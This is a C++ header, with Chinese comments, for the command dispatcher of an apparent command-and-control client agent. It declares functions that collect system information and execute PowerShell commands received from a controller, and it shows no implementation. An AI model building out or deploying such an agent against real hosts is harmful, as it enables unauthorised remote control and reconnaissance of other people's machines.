// cmd_dispatch.h — 客户端命令分发中心：按指令码分发到具体业务实现
#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>

namespace c2
{

    // 处理一条业务指令（payload 已去除 16B agent_id 前缀）。
    // 成功返回 true 并填充 response（文本字节）与 status；未知指令返回 false。
    bool handle_command(uint16_t cmd, const uint8_t *payload, size_t len,
                        std::vector<uint8_t> &response, uint8_t &status);

    // 业务实现（供 handle_command 内部调用，也可独立测试）
    std::string collect_sysinfo();                                            // SYS_INFO
    std::string exec_powershell(const std::string &command, uint8_t &status); // EXEC_PS

} // namespace c2
